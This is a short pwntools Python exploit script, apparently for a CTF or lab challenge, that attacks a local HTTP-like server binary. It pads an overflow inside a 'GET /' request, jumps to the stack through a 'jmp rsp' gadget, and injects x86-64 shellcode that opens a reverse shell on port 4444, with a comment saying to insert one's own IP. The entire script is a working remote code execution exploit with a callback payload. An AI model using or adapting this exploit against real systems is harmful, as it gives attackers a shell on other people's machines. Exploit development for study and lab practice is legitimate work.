#!/usr/bin/env python3

from pwn import *
import time

fname = "./server"
context.clear(arch='amd64')

elf = ELF(fname)
ROP.clear_cache()
rop = ROP(elf)

RET = p64(rop.find_gadget(['ret'])[0])
JMPSP = p64(next(elf.search(asm('jmp rsp'))))

# reverse shell shellcode, for port 4444
# replace bytes 1-5 with your IP

shellcode=b"\x68\x00\x00\x00\x00\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05"

filler = 0x100-19
# while filler < 0x200:
offset = b'GET /'
offlen = filler
while len(offset) < offlen:
    offset += b'\x00'

payload = offset + JMPSP + shellcode + b" HTTP"
print("payload:", payload)

p = remote("localhost", 1500)
p.sendline(payload)
time.sleep(.1)
ret = p.recv()
print(ret)
p.close()